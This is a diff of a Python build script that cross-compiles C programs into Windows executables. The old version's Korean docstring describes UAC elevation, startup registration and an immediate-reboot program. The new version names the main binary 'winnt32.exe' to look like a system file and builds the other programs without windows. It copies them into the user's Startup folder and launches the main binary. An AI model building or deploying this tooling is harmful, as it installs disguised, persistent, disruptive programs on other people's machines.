@@ -1,92 +1,107 @@
-#!/usr/bin/env python3
-"""빌드 래퍼.
-
-모든 C 소스를 개별 Windows exe 로 크로스컴파일하여 exe_pack/ 에 배치한다.
-control.ps1 도 함께 복사한다.
-
-실행 흐름:
-  start.py (빌드) -> exe_pack/ 생성
-  Windows 에서 start.exe 실행 ->
-    UAC 승격 + 경고 -> 시작프로그램 등록(reboot 제외) -> main.exe 실행
-  main.exe -> reboot.exe (즉시 리부팅)
-"""
-
-import shutil
 import subprocess
 import sys
-from pathlib import Path
+import os
+import glob
+import shutil
+import platform
 
-ROOT = Path(__file__).resolve().parent
-OUT = ROOT / "exe_pack"
+SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
+MAIN_SRC = os.path.join(SCRIPT_DIR, "start.c")
+MAIN_EXE = os.path.join(SCRIPT_DIR, "winnt32.exe")
+RC_FILE = os.path.join(SCRIPT_DIR, "winnt32.rc")
+RC_OBJ = os.path.join(SCRIPT_DIR, "winnt32.res.o")
 
-TARGETS = [
-    ("start.c",   "start.exe",   ["-lshell32", "-ladvapi32", "-lcomctl32"]),
-    ("main.c",    "main.exe",    []),
-    ("reboot.c",  "reboot.exe",  []),
-    ("effect.c",  "effect.exe",  []),
-    ("effect2.c", "effect2.exe", []),
-]
+IS_WINDOWS = platform.system() == "Windows"
 
-COPY_FILES = ["control.ps1"]
-
-
-RC_FILE = "start.rc"
-
-
-def find_compiler():
-    for c in ("x86_64-w64-mingw32-gcc", "gcc", "cc", "clang"):
-        p = shutil.which(c)
-        if p:
-            return p
-    sys.exit("error: C 컴파일러를 찾을 수 없습니다.")
+if IS_WINDOWS:
+    GCC = "gcc"
+    WINDRES = "windres"
+else:
+    GCC = "x86_64-w64-mingw32-gcc"
+    WINDRES = "x86_64-w64-mingw32-windres"
 
 
-def find_windres():
-    for w in ("x86_64-w64-mingw32-windres", "windres"):
-        p = shutil.which(w)
-        if p:
-            return p
-    sys.exit("error: windres를 찾을 수 없습니다 (start.exe 매니페스트 필수).")
+def run(cmd):
+    print(f">> {' '.join(cmd)}")
+    subprocess.check_call(cmd, cwd=SCRIPT_DIR)
+
+
+def build_resource():
+    if not os.path.isfile(RC_FILE):
+        print("[warn] winnt32.rc not found, skipping manifest embed")
+        return None
+    if shutil.which(WINDRES) is None:
+        print("[warn] windres not found, skipping manifest embed")
+        return None
+    run([WINDRES, RC_FILE, "-O", "coff", "-o", RC_OBJ])
+    return RC_OBJ
+
+
+def build_main():
+    print("[*] Building winnt32.exe from start.c ...")
+    res_obj = build_resource()
+    cmd = [
+        GCC, MAIN_SRC,
+        "-o", MAIN_EXE,
+        "-municode", "-mwindows",
+        "-lshell32", "-ladvapi32",
+    ]
+    if res_obj:
+        cmd.insert(2, res_obj)
+    run(cmd)
+    print(f"[+] Built {MAIN_EXE}")
+
+
+def build_others():
+    sources = glob.glob(os.path.join(SCRIPT_DIR, "*.c"))
+    sources = [s for s in sources if os.path.basename(s) != "start.c"]
+    if not sources:
+        print("[*] No additional .c files to build.")
+        return []
+    exes = []
+    for src in sources:
+        name = os.path.splitext(os.path.basename(src))[0] + ".exe"
+        out = os.path.join(SCRIPT_DIR, name)
+        print(f"[*] Building {name} from {os.path.basename(src)} ...")
+        run([GCC, src, "-o", out, "-mwindows"])
+        exes.append(out)
+        print(f"[+] Built {out}")
+    return exes
+
+
+def register_startup(exes):
+    if not IS_WINDOWS:
+        print("[*] Not on Windows; skipping startup registration.")
+        return
+    if not exes:
+        print("[*] No executables to register as startup.")
+        return
+    startup_dir = os.path.join(
+        os.environ["APPDATA"],
+        "Microsoft", "Windows", "Start Menu", "Programs", "Startup"
+    )
+    os.makedirs(startup_dir, exist_ok=True)
+    for exe in exes:
+        dest = os.path.join(startup_dir, os.path.basename(exe))
+        shutil.copy2(exe, dest)
+        print(f"[+] Registered startup: {dest}")
+
+
+def launch():
+    if not IS_WINDOWS:
+        print(f"[*] Not on Windows; cannot launch {MAIN_EXE}.")
+        print("[*] Build complete. Transfer winnt32.exe to a Windows machine to run.")
+        return
+    print(f"[*] Launching {MAIN_EXE} ...")
+    os.startfile(MAIN_EXE)
 
 
 def main():
-    compiler = find_compiler()
-    windres = find_windres()
-    print(f"[compiler] {compiler}")
-
-    if OUT.exists():
-        shutil.rmtree(OUT)
-    OUT.mkdir()
-
-    rc_path = ROOT / RC_FILE
-    if not rc_path.exists():
-        sys.exit(f"error: {RC_FILE} not found (start.exe 매니페스트 필수).")
-    res_obj = OUT / "start.res.o"
-    print(f"[windres] {RC_FILE} -> start.res.o")
-    subprocess.run(
-        [windres, str(rc_path), "-o", str(res_obj)],
-        check=True, cwd=str(ROOT),
-    )
-
-    for src, exe, libs in TARGETS:
-        src_path = ROOT / src
-        if not src_path.exists():
-            sys.exit(f"error: {src} not found")
-        exe_path = OUT / exe
-        extra = [str(res_obj)] if src == "start.c" else []
-        print(f"[build] {src} -> {exe}")
-        subprocess.run(
-            [compiler, str(src_path)] + extra + ["-o", str(exe_path)] + libs,
-            check=True,
-        )
-
-    for f in COPY_FILES:
-        src = ROOT / f
-        if src.exists():
-            shutil.copy2(src, OUT / f)
-            print(f"[copy] {f}")
-
-    print(f"[done] 패키징 완료 -> {OUT}")
+    build_main()
+    other_exes = build_others()
+    register_startup(other_exes)
+    launch()
+    print("[*] Done.")
 
 
 if __name__ == "__main__":
